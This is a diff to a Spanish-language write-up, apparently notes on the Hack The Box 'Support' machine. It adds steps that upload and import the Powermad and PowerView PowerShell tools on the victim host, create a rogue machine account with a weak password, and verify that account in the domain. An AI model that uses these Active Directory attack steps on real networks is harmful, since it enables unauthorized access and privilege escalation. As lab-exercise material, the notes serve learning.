@@ -268,8 +268,29 @@ En la maquina victima lo subimos usando
 upload /home/jalag/Workzone/VPN/HTB/Machines/WorkLab/Support/content/Powermad.ps1
 ```
 
+Subimos tambien [[POWERVIEW]]
+```shell
+upload /home/jalag/Workzone/VPN/HTB/Machines/WorkLab/Support/content/powerview.ps1
+```
+
 Lo importamos para que sea interpretado
 ```shell
 Import-Module .\Powermad.ps1
 ```
 
+Y lo mismo para [[POWERVIEW]]
+```shell
+Import-Module .\powerview.ps1
+```
+
+Creamos una nueva cuenta
+```shell
+New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+```
+
+
+
+Comprobamos si se ha creado
+```bash
+Get-DomainComputer SERVICEA
+```
